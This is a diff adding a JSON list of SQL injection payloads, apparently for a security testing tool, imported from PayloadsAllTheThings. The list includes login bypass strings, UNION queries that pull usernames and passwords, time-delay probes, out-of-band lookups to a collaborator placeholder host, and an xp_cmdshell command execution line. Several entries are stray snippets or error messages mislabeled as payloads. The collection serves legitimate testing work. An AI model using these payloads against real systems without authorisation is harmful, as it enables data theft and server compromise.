@@ -1,0 +1,992 @@
+[
+  {
+    "id": "sqli-0001",
+    "payload": "+HERP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0002",
+    "payload": "'||'DERP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0003",
+    "payload": "'+'herp",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0004",
+    "payload": "' 'DERP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0005",
+    "payload": "'%20'HERP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0006",
+    "payload": "'%2B'HERP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0007",
+    "payload": "page.asp?id=1 or 1=1 -- true",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0008",
+    "payload": "page.asp?id=1' or 1=1 -- true",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0009",
+    "payload": "page.asp?id=1\" or 1=1 -- true",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0010",
+    "payload": "page.asp?id=1 and 1=2 -- false",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0011",
+    "payload": "SELECT * FROM users WHERE username = 'user' AND password = 'pass';",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0012",
+    "payload": "' OR '1'='1'--",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0013",
+    "payload": "SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0014",
+    "payload": "' or 1=1 limit 1 --",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0015",
+    "payload": "sql = \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\";",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0016",
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = '\".md5(\"ffifdyop\", true).\"'\";",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0017",
+    "payload": "sql1 = \"SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0018",
+    "payload": "'\";",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0019",
+    "payload": "admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0020",
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = 'input_id';",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0021",
+    "payload": "1' UNION SELECT username, password FROM users --",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0022",
+    "payload": "SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0023",
+    "payload": "LIMIT CAST((SELECT version()) as numeric)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0024",
+    "payload": "ERROR: invalid input syntax for type numeric: \"PostgreSQL 9.5.25 on x86_64-pc-linux-gnu\"",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0025",
+    "payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0026",
+    "payload": "' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0027",
+    "payload": "' AND SLEEP(5)/*",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0028",
+    "payload": "' AND '1'='1' AND SLEEP(5)",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0029",
+    "payload": "' ; WAITFOR DELAY '00:00:05' --",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0030",
+    "payload": "BENCHMARK(2000000,MD5(NOW()))",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0031",
+    "payload": "LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a')",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0032",
+    "payload": "SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0033",
+    "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0034",
+    "payload": "exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0035",
+    "payload": "1; EXEC xp_cmdshell('whoami') --",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0036",
+    "payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
+    "mode": "attack",
+    "risk_level": "high",
+    "enabled_by_default": false,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0037",
+    "payload": "' union select 0x2720756e696f6e2073656c65637420312c3223#",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0038",
+    "payload": "-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0039",
+    "payload": "Username: attacker'--",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0040",
+    "payload": "Email: attacker@example.com",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0041",
+    "payload": "INSERT INTO users (username, email) VALUES ('attacker\\'--', 'attacker@example.com');",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0042",
+    "payload": "query = \"SELECT * FROM logs WHERE username = '\" + user_from_db + \"'\"",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0043",
+    "payload": "$pdo = new PDO(APP_DB_HOST, APP_DB_USER, APP_DB_PASS);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0044",
+    "payload": "$col = '`' . str_replace('`', '``', $_GET['col']) . '`';",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0045",
+    "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = ?\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0046",
+    "payload": "$stmt->execute([$_GET['name']]);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0047",
+    "payload": "// or",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0048",
+    "payload": "$stmt = $pdo->prepare(\"SELECT $col FROM animals WHERE name = :name\");",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0049",
+    "payload": "$stmt->execute(['name' => $_GET['name']]);",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0050",
+    "payload": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '`'anything'#' at line 1",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0051",
+    "payload": "Column not found: 1054 Unknown column ''x' in 'SELECT'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0052",
+    "payload": "ALL_PLUGINS",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0053",
+    "payload": "APPLICABLE_ROLES",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0054",
+    "payload": "CHARACTER_SETS",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0055",
+    "payload": "CHECK_CONSTRAINTS",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0056",
+    "payload": "COLLATIONS",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0057",
+    "payload": "COLLATION_CHARACTER_SET_APPLICABILITY",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0058",
+    "payload": "COLUMNS",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0059",
+    "payload": "-- Before $pdo->prepare",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0060",
+    "payload": "SELECT `\\?#\\0` FROM animals WHERE name = ?",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0061",
+    "payload": "-- After $pdo->prepare",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0062",
+    "payload": "SELECT `\\'x` FROM (SELECT table_name AS `\\'x` from information_schema.tables)y;#'#\\0` FROM animals WHERE name = ?",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0063",
+    "payload": "%27",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0064",
+    "payload": "%22",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0065",
+    "payload": "%23",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0066",
+    "payload": "%3B",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0067",
+    "payload": "%29",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0068",
+    "payload": "%2A",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0069",
+    "payload": "%%2727",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0070",
+    "payload": "%25%27",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0071",
+    "payload": "U+02BA",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0072",
+    "payload": "U+02B9",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0073",
+    "payload": "%CA%BA",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0074",
+    "payload": "U+0022",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0075",
+    "payload": "%CA%B9",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0076",
+    "payload": "U+0027",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0077",
+    "payload": "admin' OR '1'='1",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0078",
+    "payload": "SLEEP",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0079",
+    "payload": "BENCHMARK",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0080",
+    "payload": "SELECT username, password_hash FROM users WHERE username = ?",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0081",
+    "payload": "password_hash",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0082",
+    "payload": "hash(input_password)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0083",
+    "payload": "stored_password_hash == hash(input_password)",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0084",
+    "payload": "AND 1=0",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0085",
+    "payload": "SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0086",
+    "payload": "MD5(\"P@ssw0rd\")",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0087",
+    "payload": "json()",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0088",
+    "payload": "PDO::ATTR_EMULATE_PREPARES => true",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0089",
+    "payload": "$pdo->prepare(\"SELECT $INJECT_SQL_HERE...\")",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0090",
+    "payload": ":parameter",
+    "mode": "test",
+    "risk_level": "low",
+    "enabled_by_default": true,
+    "purpose": "sqli payload imported from open-source source",
+    "expected_feature": "Potential vulnerable behavior should be observable and verifiable",
+    "source": "PayloadsAllTheThings@master (imported)"
+  },
+  {
+    "id": "sqli-0091",
+    "payload": "?#\\0",
+    "mode": "test",
